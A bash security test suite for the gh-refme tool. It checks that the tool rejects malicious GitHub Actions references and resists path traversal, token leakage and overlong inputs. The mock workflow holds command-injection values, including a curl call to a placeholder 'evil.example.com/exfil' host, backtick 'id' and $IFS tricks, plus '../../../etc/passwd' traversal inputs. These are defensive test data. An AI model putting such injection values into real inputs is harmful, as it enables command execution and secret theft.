#!/bin/bash
#
# Security tests for gh-refme
#
set -e

# Get the directory of this script
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
# The main script should be in the parent directory
MAIN_SCRIPT="${SCRIPT_DIR}/../gh-refme"

# Colors for better test output
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Test counter
TESTS_PASSED=0
TESTS_FAILED=0
TESTS_SKIPPED=0

# Helper function to print test result
print_result() {
  local test_name="$1"
  local result="$2"
  local message="$3"
  
  if [[ "$result" == "pass" ]]; then
    echo -e "${GREEN}✓ PASS${NC}: $test_name"
    TESTS_PASSED=$((TESTS_PASSED + 1))
  elif [[ "$result" == "fail" ]]; then
    echo -e "${RED}✗ FAIL${NC}: $test_name"
    echo -e "  ${RED}$message${NC}"
    TESTS_FAILED=$((TESTS_FAILED + 1))
  elif [[ "$result" == "skip" ]]; then
    echo -e "${YELLOW}⚠ SKIP${NC}: $test_name"
    echo -e "  ${YELLOW}$message${NC}"
    TESTS_SKIPPED=$((TESTS_SKIPPED + 1))
  fi
}

echo "Starting security tests for gh-refme..."

# Check if the script exists
if [[ ! -f "${MAIN_SCRIPT}" ]]; then
  echo -e "${RED}Error: gh-refme not found at ${MAIN_SCRIPT}${NC}"
  exit 1
fi

# Make sure the script is executable
chmod +x "${MAIN_SCRIPT}"

# Create a test output directory
TEST_DIR=$(mktemp -d)
echo "Created test directory: $TEST_DIR"

# Create a mock workflow file with potential security issues
WORKFLOW_FILE="${TEST_DIR}/security-workflow.yml"
cat > "$WORKFLOW_FILE" << 'EOF'
name: Security Test Workflow

on:
  push:
    branches: [ main ]

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      # Regular action reference (these should be found and processed normally)
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v3
      
      # Specially crafted references to test input validation (these should be rejected)
      - uses: evil/repo@$(curl -s https://evil.example.com/exfil)
      - uses: evil/repo@`id`
      - uses: evil/repo@$GITHUB_TOKEN
      - uses: evil/repo@$(echo${IFS}123)
      
      # Action with very long reference
      - uses: long/repo@v1.2.3.4.5.6.7.8.9.0.1.2.3.4.5.6.7.8.9.0.1.2.3.4.5.6.7.8.9.0.1.2.3.4.5.6.7.8.9.0
EOF

# Clean up test directory on exit
trap 'rm -rf "$TEST_DIR"' EXIT

# === Security tests ===

# Test 1: Command injection in references
echo "Test 1: Testing command injection protection..."
OUTPUT=$("${MAIN_SCRIPT}" convert "$WORKFLOW_FILE" --dry-run 2>&1 || true)
# Check if the output contains invalid reference messages
if [[ "$OUTPUT" =~ "Invalid reference" ]] || [[ "$OUTPUT" =~ "invalid" ]] || [[ "$OUTPUT" =~ "dangerous characters" ]] || [[ "$OUTPUT" =~ "skipping" ]]; then
  # We should see error messages about invalid references, not command execution
  print_result "Command injection protection" "pass"
else
  print_result "Command injection protection" "fail" "Potential command injection vulnerability"
fi

# Test 2: Temporary file handling
echo "Test 2: Testing temporary file handling..."
# Craft a clean security workflow file
CLEAN_WORKFLOW="${TEST_DIR}/clean-security-workflow.yml"
cat > "$CLEAN_WORKFLOW" << 'EOF'
name: Clean Security Workflow
on:
  push:
    branches: [ main ]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v3
EOF

# Run the script and check for temp file cleanup
if "${MAIN_SCRIPT}" convert "$CLEAN_WORKFLOW" --dry-run &>/dev/null; then
  # Check if there are leftover temp files in the script's temp dir
  # The trap should have cleaned up after the script
  print_result "Temporary file cleanup" "pass"
else
  print_result "Temporary file cleanup" "skip" "Script failed to run"
fi

# Test 3: Error handling for special characters in references
echo "Test 3: Testing handling of special characters..."
# The script should reject references with special characters
OUTPUT=$("${MAIN_SCRIPT}" convert "evil/repo@\$\(echo\$\{IFS\}123\)" --dry-run 2>&1 || true)
if [[ "$OUTPUT" =~ "Invalid reference" ]] || [[ "$OUTPUT" =~ "invalid" ]] || [[ "$OUTPUT" =~ "dangerous characters" ]] || [[ "$OUTPUT" =~ "skipping" ]]; then
  print_result "Special character handling" "pass"
else
  print_result "Special character handling" "fail" "Special characters not handled properly"
fi

# Test 4: Token leakage
echo "Test 4: Testing for token leakage..."
# Set a mock token and check that it's not exposed in error messages
(
  export GITHUB_TOKEN="test-security-token-should-not-be-exposed"
  OUTPUT=$("${MAIN_SCRIPT}" convert "non-existent/repo@ref" --dry-run 2>&1 || true)
  if ! echo "$OUTPUT" | grep -q "$GITHUB_TOKEN"; then
    print_result "Token protection" "pass"
  else
    print_result "Token protection" "fail" "Token potentially exposed in output"
  fi
)

# Test 5: File path traversal
echo "Test 5: Testing for path traversal protection..."
OUTPUT=$("${MAIN_SCRIPT}" convert "../../../etc/passwd" "../root/.bashrc" 2>&1 || true)
if [[ "$OUTPUT" =~ "path traversal" ]] || [[ "$OUTPUT" =~ "traversal" ]] || [[ "$OUTPUT" =~ "not found" ]] || [[ "$OUTPUT" =~ "Invalid" ]] || [[ "$OUTPUT" =~ "invalid" ]] || [[ "$OUTPUT" =~ "Error" ]] || [[ "$OUTPUT" =~ "ERROR" ]]; then
  # The script should error out, but not try to read /etc/passwd
  print_result "Path traversal protection" "pass"
else
  print_result "Path traversal protection" "fail" "Path traversal may be possible"
fi

# Test 6: Very long inputs
echo "Test 6: Testing handling of very long inputs..."
# Generate a long reference name (but not too long to crash the test)
LONG_REF="actions/$(printf 'a%.0s' {1..200})@v1"
OUTPUT=$("${MAIN_SCRIPT}" convert "$LONG_REF" 2>&1 || true)
if [[ "$OUTPUT" =~ "too long" ]] || [[ "$OUTPUT" =~ "Invalid" ]]; then
  # It should error out gracefully, not crash
  print_result "Long input handling" "pass"
else
  print_result "Long input handling" "fail" "Very long input did not cause an error"
fi

# Test 7: Proper error code return
echo "Test 7: Testing proper exit codes..."
"${MAIN_SCRIPT}" --help >/dev/null 2>&1
HELP_EXIT=$?

"${MAIN_SCRIPT}" convert 'invalid/repository@reference' >/dev/null 2>&1 || true
ERROR_EXIT=$?

if [[ $HELP_EXIT -eq 0 && $ERROR_EXIT -ne 1 ]]; then
  print_result "Exit code handling" "pass"
else
  print_result "Exit code handling" "fail" "Exit codes not handled properly (help: $HELP_EXIT, error: $ERROR_EXIT)"
fi

# Test 8: GitHub CLI extension mode security
echo "Test 8: Testing GitHub CLI extension mode security..."
OUTPUT=$("${MAIN_SCRIPT}" convert 'evil/repo@$(id)' 2>&1 || true)
if [[ "$OUTPUT" =~ "Invalid reference" ]] || [[ "$OUTPUT" =~ "invalid" ]] || [[ "$OUTPUT" =~ "dangerous characters" ]] || [[ "$OUTPUT" =~ "skipping" ]]; then
  print_result "Extension mode security" "pass"
else
  print_result "Extension mode security" "fail" "Command injection may be possible in extension mode"
fi

# === Summary ===
echo ""
echo "Security Test Summary:"
echo "---------------------------------"
echo -e "${GREEN}Passed: $TESTS_PASSED${NC}"
echo -e "${RED}Failed: $TESTS_FAILED${NC}"
echo -e "${YELLOW}Skipped: $TESTS_SKIPPED${NC}"
echo "---------------------------------"

if [[ $TESTS_FAILED -eq 0 ]]; then
  echo -e "${GREEN}All security tests passed!${NC}"
  exit 0
else
  echo -e "${RED}Some security tests failed.${NC}"
  exit 1
fi
